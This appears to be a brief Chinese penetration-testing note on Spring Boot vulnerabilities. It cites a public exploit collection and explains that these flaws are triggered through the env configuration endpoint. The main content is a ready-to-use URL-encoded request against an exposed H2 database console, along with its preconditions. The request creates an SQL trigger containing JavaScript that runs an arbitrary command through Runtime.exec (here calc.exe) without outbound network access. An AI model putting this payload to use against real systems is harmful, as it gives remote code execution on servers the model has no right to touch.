# Springboot 漏洞

参考：https://github.com/LandGrey/SpringBootVulExploit
写的非常全.

**该系列漏洞主要是通过env的配置接口进行配置，刷新或者重启触发漏洞**

补：0x07：h2 database console JNDI RCE

限制：
开启 -webAllowOthers 选项，支持外网访问
开启 -ifNotExists 选项，支持创建数据库

不需要出网利用:
```
language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=org.h2.Driver&url=jdbc%3ah2%3amem%3atest%3bMODE%3dMSSQLServer%3binit%3dCREATE+TRIGGER+shell3+BEFORE+SELECT+ON+INFORMATION_SCHEMA.TABLES+AS+$$//javascript%0a%0ajava.lang.Runtime.getRuntime().exec('cmd+/c+calc.exe')$$&user=sa&password=
```
